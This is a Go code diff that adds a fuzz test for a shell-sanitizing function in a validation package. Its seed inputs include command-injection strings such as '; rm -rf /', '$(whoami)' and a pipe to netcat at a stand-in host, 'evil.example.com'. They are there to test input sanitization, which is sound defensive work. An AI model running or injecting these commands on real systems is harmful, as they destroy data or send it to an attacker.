@@ -1,6 +1,9 @@
 package validation
 
-import "testing"
+import (
+	"strings"
+	"testing"
+)
 
 func FuzzValidateShellCommand(f *testing.F) {
 	f.Add("nginx -s reload")
@@ -55,5 +58,52 @@ func FuzzValidateACMEToken(f *testing.F) {
 	f.Fuzz(func(t *testing.T, token string) {
 		// Should never panic, only return error for invalid input
 		_ = ValidateACMEToken(token)
+	})
+}
+
+// FuzzSanitizeForShell pins SanitizeForShell's "no panic + output is
+// shell-safe" invariant. The function wraps input in POSIX single-quotes
+// with escapes for embedded `'`. Bundle O.2 adds this target so any
+// adversarial unicode / NUL / control-byte / shell-metachar input is
+// regression-tested against the wrap contract.
+func FuzzSanitizeForShell(f *testing.F) {
+	seeds := []string{
+		"",
+		"plain",
+		"with space",
+		"with'apostrophe",
+		"with\"double-quote",
+		"with$dollar",
+		"with`backtick`",
+		"with\nnewline",
+		"with\ttab",
+		"with\x00nul",
+		"; rm -rf /",
+		"$(whoami)",
+		"`whoami`",
+		"|nc evil.example.com 1234",
+		"unicode: 你好世界",
+		strings.Repeat("'", 100),
+		strings.Repeat("a", 10000),
+	}
+	for _, s := range seeds {
+		f.Add(s)
+	}
+	f.Fuzz(func(t *testing.T, input string) {
+		defer func() {
+			if r := recover(); r != nil {
+				t.Fatalf("panic on input %q: %v", input, r)
+			}
+		}()
+		out := SanitizeForShell(input)
+		// Invariants:
+		//   1. Output is non-empty (always at least the surrounding quotes)
+		//   2. Output starts and ends with a single quote
+		if len(out) < 2 {
+			t.Fatalf("output %q too short for input %q", out, input)
+		}
+		if out[0] != '\'' || out[len(out)-1] != '\'' {
+			t.Fatalf("output %q does not begin+end with single-quote for input %q", out, input)
+		}
 	})
 }
